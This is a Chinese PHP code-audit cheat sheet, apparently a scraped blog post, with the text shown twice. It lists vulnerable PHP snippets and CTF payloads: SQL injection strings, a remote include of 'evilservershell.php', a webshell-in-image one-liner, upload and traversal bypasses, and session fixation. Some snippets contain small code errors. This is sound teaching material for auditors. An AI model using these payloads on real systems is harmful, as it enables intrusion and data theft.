($_GET['nctf'], '#biubiubiu') !== FALSE)   \n            die('Flag: '.$flag);\n        else\n            echo '骚年，继续努力吧啊~';\n    }\n```\n\n### 十六进制与十进制比较\n\n== 两边的十六进制与十进制比较，是可以相等的。\n\n```php\n#?password=0xdeadc0de\n#echo  dechex ( 3735929054 ); // 将3735929054转为16进制结果为：deadc0de\n<?php\nerror_reporting(0);\nfunction noother_says_correct($temp)\n{\n    $flag = 'flag{test}';\n    $one = ord('1');  //ord — 返回字符的 ASCII 码值\n    $nine = ord('9'); //ord — 返回字符的 ASCII 码值\n    $number = '3735929054';\n    // Check all the input characters!\n    for ($i = 0; $i < strlen($number); $i++)\n    { \n        // Disallow all the digits!\n        $digit = ord($temp{$i});\n        if ( ($digit >= $one) && ($digit <= $nine) ) ## 1到9不允许，但0允许\n        {\n            // Aha, digit not allowed!\n            return \"flase\";\n        }\n    }\n    if($number == $temp) # \n        return $flag;\n}\n$temp = $_GET['password'];\necho noother_says_correct($temp);\n```\n\n\n## md5注入带入’or’\n原理：\n```php\nmd5(string,raw)\nraw\t可选。规定十六进制或二进制输出格式：\n    TRUE - 原始 16 字符二进制格式\n    FALSE - 默认。32 字符十六进制数\n```\n当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为`'or'<trash>` 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。\n```php\n## 执行顺序:字符串：ffifdyop -> md5()加密成276f722736c95d99e921722cf9ed621c->md5(,true)将16进制转成字符串`'or'<trash>`->sql执行`'or'<trash>`造成注入\n$sql = \"SELECT * FROM admin WHERE username = admin pass = '\".md5($password,true).\"'\";\n```\n\n## switch没有break\n```php\n#这里case 0 和 1 没有break,使得程序继续往下执行。\n<?php\nerror_reporting(0);\nif (isset($_GET['which']))\n{\n    $which = $_GET['which'];\n    switch ($which)\n    {\n    case 0:\n    case 1:\n    case 2:\n        require_once $which.'.php';\n         echo $flag;\n        break;\n    default:\n        echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);\n        break;\n    }\n}\n```\n\n## 反序列化\n\n```php\n<!-- index.php -->\n<?php \n\trequire_once('shield.php');\n\t$x = new Shield();\n\tisset($_GET['class']) && $g = $_GET['class'];\n\tif (!empty($g)) {\n\t\t$x = unserialize($g);\n\t}\n\techo $x->readfile();\n?>\n<img src=\"showimg.php?img=c2hpZWxkLmpwZw==\" width=\"100%\"/>\n<!-- shield.php -->\n<?php\n\t//flag is in pctf.php\n\tclass Shield {\n\t\tpublic $file;\n\t\tfunction __construct($filename = '') {\n\t\t\t$this -> file = $filename;\n\t\t}\n\t\t\n\t\tfunction readfile() {\n\t\t\tif (!empty($this->file) && stripos($this->file,'..')===FALSE  \n\t\t\t&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\\\')==FALSE) {\n\t\t\t\treturn @file_get_contents($this->file);\n\t\t\t}\n\t\t}\n\t}\n?>\n<!-- showimg.php -->\n<?php\n\t$f = $_GET['img'];\n\tif (!empty($f)) {\n\t\t$f = base64_decode($f);\n\t\tif (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\\\')===FALSE\n\t\t//stripos — 查找字符串首次出现的位置（不区分大小写）\n\t\t&& stripos($f,'pctf')===FALSE) {\n\t\t\treadfile($f);\n\t\t} else {\n\t\t\techo \"File not found!\";\n\t\t}\n\t}\n?>\n```\n\n```php\n#?class=O:6:\"Shield\":1:{s:4:\"file\";s:8:\"pctf.php\";}\n<!-- answer.php -->\n<?php\n\nrequire_once('shield.php');\n$x = class Shield();\n$g = serialize($x);\necho $g;\n\n?>\n\n<!-- shield.php -->\n<?php\n    //flag is in pctf.php\n    class Shield {\n        public $file;\n        function __construct($filename = 'pctf.php') {\n            $this -> file = $filename;\n        }\n        \n        function readfile() {\n            if (!empty($this->file) && stripos($this->file,'..')===FALSE  \n            && stripos($this->file,'/')===FALSE && stripos($this->file,'\\\\')==FALSE) {\n                return @file_get_contents($this->file);\n            }\n        }\n    }\n?>\n```\n\n## 文件包含\n\n原理：\n\ninclude()/include_once()，require()/require_once()，中的变量可控\n\n利用过程：\n```\n上传图片（含有php代码的图片） \n读文件，读php文件 \n包含日志文件getshell \n包含/proc/self/envion文件getshell \n如果有phpinfo可以包含临时文件 \n包含data://或php://input等伪协议（需要allow_url_include=On)\n```\n\n封闭协议：\n```\nfile:// — 访问本地文件系统\nhttp:// — 访问 HTTP(s) 网址\nftp:// — 访问 FTP(s) URLs\nphp:// — 访问各个输入/输出流（I/O streams）\nzlib:// — 压缩流\ndata:// — 数据（RFC 2397）\nglob:// — 查找匹配的文件路径模式\nphar:// — PHP 归档\nssh2:// — Secure Shell 2\nrar:// — RAR\nogg:// — 音频流\nexpect:// — 处理交互式的流\n```\n\n\n```php\n## 访问共享目录\ninclude ('\\evilservershell.php');\n```\n\n\n## 提交参数无过滤\n\n原理:过滤了GPC，但没有过滤其它部分。\n\n```bash\n上传文件相关变量如$_FIle\n$_GET，$_POST，$_Cookie，$_SERVER，$_ENV，$_SESSION，$_REQUEST\nHTTP_CLIENT_IP 和HTTP_XFORWORDFOR 中的ip不受gpc影响\n$_HTTP_COOKIE_VARS\n$_HTTP_ENV_VARS\n$_HTTP_GET_VARS\n$_HTTP_POST_FILES\n$_HTTP_POST_VARS\n$_HTTP_SERVER_VARS\n```\n\n案例：\n```php\nforeach($_COOKIE AS $_key=>$_value){\n\tunset($$_key);\n}\nforeach($_POST AS $_key=>$_value){\n\t!ereg(\"^\\_[A-Z]+\",$_key) && $$_key=$_POST[$_key];\n}\nforeach($_GET AS $_key=>$_value){\n\t!ereg(\"^\\_[A-Z]+\",$_key) && $$_key=$_GET[$_key];\n}\n```\n通过表单来传值。\n```html\n<form method=\"post\" action=\"http://localhost/qibo/member/comment.php?job=ifcom\" enctype=\"multipart/form-data\">\n<input type=\"file\" name=\"cidDB\">  \n<input type=\"submit\">\n</form>\n```\n这里的gid为查询参数\n```php\n$_SERVER                 //中用户能够控制的变量，php5.0后不受GPC影响\nQUERY_STRING             //用户GET方法提交时的查询字符串\nHTTP_REFERER             //用户请求的来源变量，在一些程序取得用户访问记录时用得比较多\nHTTP_USER_AGENT          //用户的浏览器类型，也用于用户的访问记录的取得\nHTTP_HOST                //提交的主机头等内容\nHTTP_X_FORWARDED_FOR     //用户的代理主机的信息\n```\n\n## 伪造IP\n原理:\n以 HTTP_ 开头的 header,  均属于客户端发送的内容。那么，如果客户端伪造user-agent/referer/client-ip/x-forward-for,就可以达到伪造IP的目的,php5之后不受GPC影响。\n```php\n关键字：\nHTTP_\ngetenv\n$_SERVER\n服务端：\necho getenv('HTTP_CLIENT_IP');\necho $_SERVER['REMOTE_ADDR']; //访问端（有可能是用户，有可能是代理的）IP\necho $_SERVER['HTTP_CLIENT_IP']; //代理端的（有可能存在，可伪造）\necho $_SERVER['HTTP_X_FORWARDED_FOR']; //用户是在哪个IP使用的代理（有可能存在，也可以伪造）\n客户端：\n注意发送的格式：\nCLIENT-IP:10.10.10.1\nX-FORWARDED-FOR:10.10.10.10\n```\n\n```\n这个玩意恒成立的。不管有没有clientip\n【strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')】\n```\n\n\n## 绕过正则匹配\n\n\n### 缺少^和$限定\n\n\n### 数组绕过正则\n\n【\\A[ _a-zA-Z0-9]+\\z】\n\n\n### str_replace路径穿越\n原理\nstr_replace的过滤方式为其search参数数组从左到右一个一个过滤。\n\n```php\n## 这里可以被绕过，因为是对.和/或\\的组合的过滤，所以单独的..或\\/没有检测到。\n## 方法1\n## 五个点加///\n## 方法2\n## ...././/\n$dir = str_replace(array('..\\\\', '../', './', '.\\\\'), '', trim($dir),$countb);\necho $dir;\necho '</br>替换数量';\necho $countb;\n```\n\n```php\n## 这里有对单独的.进行过滤，所以无法绕过。\n$file = str_replace(array('../', '\\\\', '..'), array('', '/', ''), $_GET['file'],$counta);\necho $file;\necho '</br>替换数量';\necho $counta;\n```\n\n\n## short_open_tag=on 短标签\n\n原理：\n当 php.ini 的short_open_tag=on时，PHP支持短标签，默认情况下为off；\n格式为：<?xxxx;?> --> <?xxx;\n```bash\nGo0s@ubuntu:~$ cat test.php\n<?=\"helloworld\";\nGo0s@ubuntu:~$ curl 127.0.0.1/test.php\nhelloworld\n```\n\n\n## file_put_contents第二个参数传入数组\n\n原理：\n```php\nfile_put_contents(file,data,mode,context)\nfile\t必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。\ndata\t可选。规定要写入文件的数据。可以是字符串、数组或数据流。如果是数组的话，将被连接成字符串再进行写入。\n```\n\n```php\n## ?filename=xiaowei.php&data[]=<?php&data[]=%0aphpinfo();\n## 这个要从burp去传，因为后面的【?】会被理解为参数而截断\n<?php\n$a = $_GET['data'];\n$file = $_GET['filename'];\n$current = file_get_contents($file);\nfile_put_contents($file, $a);\n```\n\n\n## 单引号和双引号\n\n原理：单引号或双引号都可以用来定义字符串。但只有双引号会调用解析器。\n\n```php\n# 1\n$s = \"I am a 'single quote string' inside a double quote string\"; \n$s = 'I am a \"double quote string\" inside a single quote string'; \n$s = \"I am a 'single quote string' inside a double quote string\"; \n$s = 'I am a \"double quote string\" inside a single quote string';\n# 2\n$abc='I love u'; \necho $abc //结果是:I love u \necho '$abc' //结果是:$abc \necho \"$abc\" //结果是:I love u \n# 3\n$a=\"${@phpinfo()}\"; //可以解析出来\n<?php $a=\"${@phpinfo()}\";?> //@可以为空格，tab，/**/ ，回车，+，-，!，~,\\等\n```\n\n\n### 查询语句缺少单引号\n\n```php\n\"Select * from table where id=$id\" # 有注入\n\"Select * from table where id=\".$id.\" limit 1\" # 有注入\n\"Select * from table where id='$id'\" # 无注入\n\"Select * from table where id='\".$id.\"' limit 1\" # 无注入\n```\n\n## 宽字符注入\n原理\n常见转码函数：\niconv()\nmb_convert_encoding()\naddslashes\n防御：\n用mysql_real_escape_string\n\n```php\n## ?username=tom&password=1%df' or 1=1 union select 1,2,group_concat(0x0a,mname,0x0a,pwd) from manager--+\n## %df把\\给吃掉\n$pwd = addslashes($pwd);\nmysql_query(\"SET NAMES gbk\");\n$query = \"select * from user where uname='\".$uname.\"' and pwd='\".$pwd.\"'\";\n```\n\n## 跳转无退出\n原理:\n没有使用return()或die()或exit()退出流程的话，下面的代码还是会继续执行。可以使用burp测试，不会跳转过去。\n```php\n## 1\n$this->myclass->notice('alert(\"系统已安装过\");window.location.href=\"'.site_url().'\";');\n## 2\nheader(\"location: ../index.php\");\n```\n\n## 二次编码注入\n由于浏览器的一次urldecode，再由服务器端函数的一次decode，造成二次编码，而绕过过滤。\n如%2527，两次urldecode会最后变成'\n```\nbase64_decode -- 对使用 MIME base64 编码的数据进行解码\nbase64_encode -- 使用 MIME base64 对数据进行编码\nrawurldecode -- 对已编码的 URL 字符串进行解码\nrawurlencode -- 按照 RFC 1738 对 URL 进行编码\nurldecode -- 解码已编码的 URL 字符串\nurlencode -- 编码 URL 字符串\nunserialize/serialize\n字符集函数（GKB,UTF7/8...）如iconv()/mb_convert_encoding()等\n```\n\n## 前端可控变量填充导致XSS\n\n当html里的链接是变量时，易出现XSS。\n```html\n={#、echo、print、printf、vprintf、<%=$test%>\nimg scr={#$list.link_logo#}\n```\n\n## 命令执行函数\n\n```php\nsystem()\nexec()\npassthru()\npcntl_exec()\nshell_exec()\necho `whoami`; //反引号调用shell_exec()函数\npopen()和proc_open() //不会返回结果\narray_map($arr,$array); //为数组的每个元素应用回调函数arr,如$arr = \"phpinfo\"\npopen('whoami >>D: /2.txt', 'r'); //这样就会在D下生成一个2.txt。\npreg_replace()\nob_start()\narray_map()\n```\n防范方法：\n使用自定义函数或函数库来替代外部命令的功能\n使用escapeshellarg 函数来处理命令参数\n使用safe_mode_exec_dir 指定可执行文件的路径\n\n### create_function\ncreate_function构造了一个return后面的语句为一个函数。\n```php\n#?sort_by=\"]);}phpinfo();/*\n#sort_function就变成了 return 1 * strnatcasecmp($a[\"\"]);}phpinfo();/*\"], $b[\"\"]);}phpinfo();/*\"]);\n#前面闭合，然后把后面的全部注释掉了。\n<?php\n$sort_by=$_GET['sort_by'];\n$sorter='strnatcasecmp';\n$databases=array('test','test');\n$sort_function = ' return 1 * ' . $sorter . '($a[\"' . $sort_by . '\"], $b[\"' . $sort_by . '\"]);';\nusort($databases, create_function('$a, $b', $sort_function));\n```\n\n\n\n### mb_ereg_replace()的/e模式\n原理\n```\nmb_ereg_replace()是支持多字节的正则表达式替换函数,函数原型如下:\nstring mb_ereg_replace  ( string $pattern , string $replacement  , string $string  [, string $option= \"msr\"  ] )\n当指定mb_ereg(i)_replace()的option参数为e时,replacement参数[在适当的逆向引用替换完后]将作为php代码被执行.\n```\n\n### preg_replace /e模式执行命令\n```php\n# ?str=[phpinfo()]\n# 这里使用/e模式，所以第二个参数\\\\1这里可以执行。\n# 通过$_GET传入值，第一个参数正则,把[]去掉，放到了第二个参数里\\\\1，执行。\npreg_replace(\"/\\[(.*)]/e\",'\\\\1',$_GET['str']);\n```\n\n## 动态函数执行\n```php\ncall_user_func\ncall_user_func_array\n```\n\n```php\n# ?a=assert\ncall_user_func($_GET['a'],$b);\n```\n\n\n## 代码执行\n```php\nassert()\ncall_user_func()\ncall_user_func_array()\ncreate_function()\n```\n\n### eval()和assert()代码执行\n\n当assert()的参数为字符串时 可执行PHP代码。\n区别：assert可以不加;，eval不可以不加;。\n```php\neval(\" phpinfo(); \");【√】 eval(\" phpinfo() \");【X】\nassert(\" phpinfo(); \");【√】 assert(\" phpinfo() \");【√】\n```\n\n\n## 优先级绕过\n原理：\n如果运算符优先级相同，那运算符的结合方向决定了该如何运算\nhttp://php.net/manual/zh/language.operators.precedence.php\n\n优先级：&&/|| 大于 = 大于 AND/OR\n\n```php\n# ($test = true) and false; $test2 = (true && false);\n$test = true and false; var_dump($test);//bool(true) \n$test2 = true && false; var_dump($test2); //bool(false)\n\n# 当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过\n$test3 = is_numeric(\"123\") and is_numeric(\"anything false\"); var_dump($test3); //bool(true)\n```\n\n## getimagesize图片判断绕过\n原理：\n当用getimagesize判断文件是否为图片,可以判断的文件为gif/png/jpg，如果指定的文件如果不是有效的图像，会返回 false。\n只要我们在文件头部加入GIF89a后可以上传任意后缀文件。\n\n生成小马图的方法：\n```bash\ncat image.png webshell.php > image.php\n```\n\n```php\n## 找上传点\n## 文件头部加入GIF89a\n# 1\n$file = $request->getFiles();\n# 2\nif(getimagesize($files['users']['photo']['tmp_name']))\n        {\n          move_uploaded_file($files['users']['photo']['tmp_name'], $filename);\n# 3\n$filesize = @getimagesize('/path/to/image.png');\nif ($filesize) {\n    do_upload();\n}\n```\n\n## <变*，windows findfirstfile利用\n\n原理：\nWindows下，在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。\n执行过程中，字符\">\"被替换成\"?\"，字符\"<\"被替换成\"*\"，而符号\"（双引号）被替换成一个\".\"字符。\n所以：\n1. \">\"\">>\"可代替一个字符,\"<\"可以代替后缀多个字符，\"<<\"可以代替包括文件名和后缀多个字符。所以一般使用<<\n2. \" 可以代替.\n3. 文件名第一个字符是\".\"的话，读取时可以忽略之\n\n| NO   | Status | Function             | Type of operation      |\n| ---- | ------ | -------------------- | ---------------------- |\n| 1.   | OK     | include()            | Includefile            |\n| 2.   | OK     | include_once()       | Includefile            |\n| 3.   | OK     | require()            | Includefile            |\n| 4.   | OK     | require_once()       | Include file           |\n| 5.   | OK     | fopen()              | Openfile               |\n| 6.   | OK     | ZipArchive::open()   | Archive file           |\n| 7.   | OK     | copy()               | Copyfile               |\n| 8.   | OK     | file_get_contents()  | Readfile               |\n| 9.   | OK     | parse_ini_file()     | Readfile               |\n| 10.  | OK     | readfile()           | Readfile               |\n| 11.  | OK     | file_put_contents()  | Write file             |\n| 12.  | OK     | mkdir()              | New directory creation |\n| 13.  | OK     | tempnam()            | New file creation      |\n| 14.  | OK     | touch()              | New file creation      |\n| 15.  | OK     | move_uploaded_file() | Move operation         |\n| 16.  | OK     | opendiit)            | Directory operation    |\n| 17.  | OK     | readdir()            | Directory operation    |\n| 18.  | OK     | rewinddir()          | Directory operation    |\n| 19.  | OK     | closedir()           | Directory operation    |\n| 20.  | FAIL   | rename()             | Move operation         |\n| 21.  | FAIL   | unlink()             | Delete file            |\n| 22.  | FAIL   | rmdir())             | Directory operation    |\n\n```php\n## ?file=1<\n## ?file=1>\n## ?file=1\"txt\n文件名为1.txt\n\n## ?file=1234.tx>\n## ?file=1234.<\n## ?file=1<<\n## ?file=1<<\">\n## ?file=123>\">\n## ?file=>>>4\">\n## ?file=<<4\">\n文件名为1234.txt\n\ninclude('shell<');  \ninclude('shell<<');\ninclude('shell.p>p'); \ninclude('shell\"php');\nfopen('.htacess');  //==>fopen(\"htacess');\nfile_get_contents('C:boot.ini'); //==>  file_get_contents ('C:/boot.ini');\nfile_get_contents('C:/tmp/con.jpg'); //此举将会无休无止地从CON设备读取0字节，直到遇到eof\nfile_put_contents('C:/tmp/con.jpg',chr(0×07));  //此举将会不断地使服务器发出类似哔哔的声音\n```\n\n## 处理value没有处理key\n\nforeach时,addslashes对获得的value值进行处理，但没有处理key。\n\n\n## 用来目录遍历的特别函数\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094\nlstat 函数\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071\nstream_resolve_include_path函数\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453\n\n\n## 绕过GD库图片渲染\n\n[jpg_payload.zip](file/PHP代码审计_jpg_payload.zip)\n\njpg_name.jpg是待GD处理的图片\n```\nphp jpg_payload.php <jpg_name.jpg>\n```\n生成好的图片，在经过如下代码处理后，依然能保留其中的shell：\n\n```php\n<?php\n    imagecreatefromjpeg('xxxx.jpg');\n?>\n```\n\n## 会话固定\n\n```php\nif(!empty($_GET['phpsessid'])) session_id($_GET['phpsessid']);//通过GET方法传递sessionid\n```\n通过get方法来设置session。所以可以通过CSRF：\n\nhttp://xxxx/index.php?r=admin/index/index&phpsessid=f4cking123\n\n管理员点了我们就能使用此session进后台了。\n\n## end方法获取元素的问题\n\n```php\n$file = array(1 => 'png', 0 => 'php');\n\n$ext = $file[count($file) - 1];\n\n$ext = end($file);\n```\n\n两者的区别是，前者是通过下标来确定，后者则是返回数组的最后一个元素。前者返回的是$filename[1]也就是png,后者直接返回数组排在最后面的元素php。\n\n## 资料\n\nPHP代码审计分段讲解\n\nhttps://github.com/bowu678/php_bugs\n\nhttps://github.com/jiangsir404/Audit-Learning\n\n\nhttps://read.douban.com/reader/ebook/16642056/","source":"_posts/代码审计.md","raw":"---\ntitle: PHP代码审计归纳\ndate: 2018-04-18 10:27:37\ntags: \n- web\n---\n\n\n\n# PHP代码审计归纳\n\nAuthor: 木禾 ali0th\n\nhttps://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md\n## 变量覆盖\n### extract()\n该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR_SKIP则不行。\n```php\n<?php\n$a = \"Original\";\n$my_array = array(\"a\" => \"Cat\",\"b\" => \"Dog\", \"c\" => \"Horse\");\nextract($my_array); \necho \"\\$a = $a; \\$b = $b; \\$c = $c\";\n?>\n# 结果：$a = Cat; $b = Dog; $c = Horse\n\n```\n这里原来是\\$a是original，后面通过extract把$a覆盖变成了Cat了,所以这里把原来的变量给覆盖了。\n\n```php\n#?shiyan=&flag=1\n<?php\n$flag='xxx'; \nextract($_GET);\n if(isset($shiyan))\n { \n    $content=trim(file_get_contents($flag)); # content is 0 , flag can be anything,cause file_get_contents cannot open file, return 0\n    if($shiyan==$content)\n    { \n        echo 'ctf{xxx}'; \n    }\n   else\n   { \n    echo'Oh.no';\n   } \n   }\n```\n<!--more-->\n### parse_str()\n\n解析字符串并注册成变量\n```php\n$b=1;\nParse_str('b=2');\nPrint_r($b);\n# 结果: $b=2\n```\n\n### import_request_variables()\n\n```php\n将 GET/POST/Cookie 变量导入到全局作用域中，全局变量注册。\n在5.4之后被取消，只可在4-4.1.0和5-5.4.0可用。\n//导入POST提交的变量值，前缀为post_\nimport_request_variable(\"p\"， \"post_\");\n//导入GET和POST提交的变量值，前缀为gp_，GET优先于POST\nimport_request_variable(\"gp\"， \"gp_\");\n//导入Cookie和GET的变量值，Cookie变量值优先于GET\nimport_request_variable(\"cg\"， \"cg_\");\n```\n\n### $变量覆盖\n\n```php\n## 提交参数chs，则可覆盖变量\"$chs\"的值。$key为chs时，$$key就变成$chs\n<?  \n$chs = '';  \nif($_POST && $charset != 'utf-8'){  \n    $chs = new Chinese('UTF-8', $charset);  \n    foreach($_POST as $key => $value){  \n        $$key = $chs->Convert($value);  \n    }  \n    unset($chs);  \n} \n```\n\n### 全局变量覆盖漏洞\n\n原理：\nregister_globals 是php中的一个控制选项，可以设置成off或者on, 默认为off, 决定是否将 EGPCS（Environment，GET，POST，Cookie，Server）变量注册为全局变量。\n如果register_globals打开的话, 客户端提交的数据中含有GLOBALS变量名, 就会覆盖服务器上的$GLOBALS变量.\n\n\\$_REQUEST 这个超全局变量的值受 php.ini中request_order的影响，在php5.3.x系列中，request_order默认值为GP，也就是说默认配置下$_REQUEST只包含$_GET和$_POST而不包括$_COOKIE。通过COOKIE就可以提交GLOBALS变量。\n\n```php\n<?php\n// register_globals =ON\n//foo.php?GLOBALS[foobar]=HELLO\necho $foobar;\n\n//为了安全取消全局变量\n//var.php?GLOBALS[a]=aaaa&b=111\nif (ini_get(\"register_globals\")) foreach($_REQUEST as $k=>$v) unset(${$k});\nprint $a;\nprint $_GET[b]; \n```\n经过测试，开了register_globals会卡死\n\n\n## 绕过过滤的空白字符\n\n原理：https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6\n\n```\n控制码\n\"\\0\" \"%00\" (ASCII  0 (0x00))，空字节符。\n\n制表符\n\"\\t\" (ASCII  9 (0x09))，水平制表符。\n\n空白字符：\n\"\\n\" (ASCII 10 (0x0A))，换行符。\n\"\\v\" \"\\x0b\" (ASCII  11 (0x0B))，垂直制表符。\n\"\\f\" \"%0c\" 换页符\n\"\\r\" \"%0d\"(ASCII  13 (0x0D))，回车符。\n\n空格:\n\" \" \"%20\" (ASCII  32 (0x20))，普通空格符。\n```\n\n而trim过滤的空白字符有\n```php\nstring trim ( string $str [, string $character_mask = \" \\t\\n\\r\\0\\x0B\" ] )\n```\n其中缺少了\\f\n\n2 函数对空白字符的特性\nis_numeric函数在开始判断前，会先跳过所有空白字符。这是一个特性。\n也就是说，is_numeirc(\" \\r\\n \\t 1.2\")是会返回true的。同理，intval(\" \\r\\n \\t 12\")，也会正常返回12。\n\n\n\n案例\n\nhttps://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php\n```php\n#?number=%00%0c191\n# 1 %00绕过is_numeric\n# 2 \\f（也就是%0c）在数字前面，trim，intval和is_numeric都会忽略这个字符\n```\n\n## intval整数溢出\n\nphp整数上限溢出绕过intval\n\nintval 函数最大的值取决于操作系统。 \n32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval('1000000000000') 会返回 2147483647。\n64 位系统上，最大带符号的 integer 值是 9223372036854775807。\n\n## intval 四舍五入\n\n\n```php\n# ?a=1024.1\n<?php\nif($_GET[id]) {\nmysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\nmysql_select_db(SAE_MYSQL_DB);\n$id = intval($_GET[id]); ## 这里过滤只有一个intval\n$query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\"));\nif ($_GET[id]==1024) {\n    echo \"<p>no! try again</p>\";\n    }\n  else{\n    echo($query[content]);\n  }\n}\n```\n\n## 浮点数精度忽略\n```php\nif ($req[\"number\"] != intval($req[\"number\"]))\n```\n在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。\n输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等。\n\n\n\n\n## 多重加密\n\n\n题目中有：\n```php\n$login = unserialize(gzuncompress(base64_decode($requset['token'])));\nif($login['user'] === 'ichunqiu'){echo $flag;}\n```\n本地则写：\n```php\n<?php\n$arr = array(['user'] === 'ichunqiu');\n$token = base64_encode(gzcompress(serialize($arr)));\nprint_r($token);\n// 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=\n?>\n```\n\n## 截断\n\n### iconv 异常字符截断\n\n```php\n## 因iconv遇到异常字符就不转后面的内容了，所以可以截断。\n## 这里chr(128)到chr(255)都可以截断。\n$a='1'.char(130).'2';\necho iconv(\"UTF-8\",\"gbk\",$a); //将字符串的编码从UTF-8转到gbk\necho iconv('GB2312', 'UTF-8', $str); //将字符串的编码从GB2312转到UTF-8\n```\n\n### eregi、ereg可用%00截断\n\n功能：正则匹配过滤\n条件：要求php<5.3.4\n\n```php\n## http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*\n#GET方式提交password，然后用ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母，继续strlen()限制了长度小于8并且大小必须大于9999999，继续strpos()对password进行匹配，必须含有-，最终才输出flag\n#因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。\n#对于另一个难题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造 1e8 即 100000000 > 9999999，在加上-。于是乎构造password=1e8%00*-*,成功得到答案\n<?php\nif (isset ($_GET['password'])) {\n    if (ereg (\"^[a-zA-Z0-9]+$\",$_GET['password']) === FALSE)    \n       {\n        echo '<p>You password must be alphanumeric</p>';\n    }\n    else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)\n    {\n        if (strpos ($_GET['password'], '*-*') !== FALSE)\n        {\n            die('Flag: ' . $flag);\n        }\n        else\n        {\n            echo('<p>*-* have not been found</p>');\n        }\n    }\n    else\n    {\n        echo '<p>Invalid password</p>';\n    }\n}\n```\n\n\n### move_uploaded_file 用\\0截断\n5.4.x<= 5.4.39, 5.5.x<= 5.5.23, 5.6.x <= 5.6.7\n原来在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生\ncve：\nhttps://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348\n\n`move_uploaded_file($_FILES['x']['tmp_name'],\"/tmp/test.php\\x00.jpg\")`\n上传抓包修改name为a.php\\0jpg（\\0是nul字符），可以看到$_FILES['xx']['name']存储的字符串是a.php，不会包含\\0截断之后的字符，因此并不影响代码的验证逻辑。\n但是如果通过$_REQUEST方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。\n\n### include用？截断\n\n```php\n<?php\n$name=$_GET['name'];  \n$filename=$name.'.php';  \ninclude $filename;  \n?>\n```\n当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。\n测试POC：\nhttp://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt?\n则会打开secret.txt中的文件内容。本测试用例在PHP5.5.38版本上测试通过。\n\n### 系统长度截断\n这种方式在PHP5.3以后的版本中都已经得到了修复。\nwin260个字符，linux下4*1024=4096字节\n\n### mysql长度截断\nmysql内的默认字符长度为255，超过的就没了。\n由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning\n\n### mysql中utf-8截断\n\n`insert into dvwa.test values (14,concat(\"admin\",0xc1,\"abc\"))`\n\n写入为admin\n\n\n## 弱类型比较\n\n原理\n\n比较表：http://php.net/manual/zh/types.comparisons.php\n\n以下等式会成立\n```php\n'' == 0 == false\n'123' == 123\n'abc' == 0\n'123a' == 123\n'0x01' == 1\n'0e123456789' == '0e987654321'\n[false] == [0] == [NULL] == ['']\nNULL == false == 0\ntrue == 1\n```\n\n### ==、>、<的弱类型比较\n\n这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型转换成整型再比。\n\n```php\n##方法1\n##$a[\"a1\"]=\"1e8%00\";\n##这里用%00绕过is_numeric,然后1e8可以比1336大，因此最后能$v1=1\n##方法2\n##$a[\"a1\"]=[\"a\"];\n##使用数组，可以，因为数组恒大于数字或字符串\n##方法3\n##$a[\"a1\"]=1337a;\n##1337a过is_numeric，又由>转成1337与1336比较\n<?php\nis_numeric(@$a[\"a1\"])?die(\"nope\"):NULL;    \nif(@$a[\"a1\"]){\n\t\tvar_dump($a);\n        ($a[\"a1\"]>1336)?$v1=1:NULL;\n}\nvar_dump($v1);\n```\n\n### switch 弱类型\n```php\n// 第一种：弱类型，1e==1\n// $x1=1e\n// 第二种：利用数组名字bypass\n// $x1=1[]\n// 传入后为string(3) \"1[]\",但在switch那里为1\nif (isset($_GET['x1']))\n{ \n        $x1 = $_GET['x1']; \n        $x1==\"1\"?die(\"ha?\"):NULL; \n        switch ($x1) \n        { \n        case 0: \n        case 1: \n                $a=1; \n                break; \n        } \n}\n```\n\n### md5比较（0e相等、数组为Null）\n```php\nmd5('240610708') 